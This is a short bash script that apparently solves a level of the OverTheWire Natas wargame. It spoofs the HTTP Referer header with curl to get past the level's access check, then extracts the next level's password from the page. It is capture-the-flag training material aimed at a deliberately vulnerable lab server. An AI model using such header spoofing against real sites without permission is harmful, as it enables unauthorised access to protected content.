#!/bin/bash

natas5pass=$(curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -s -u natas4:$natas4pass http://natas4.natas.labs.overthewire.org/index.php | grep "Access granted. The password for natas5 is " | sed 's/Access granted. The password for natas5 is //')
echo $natas5pass
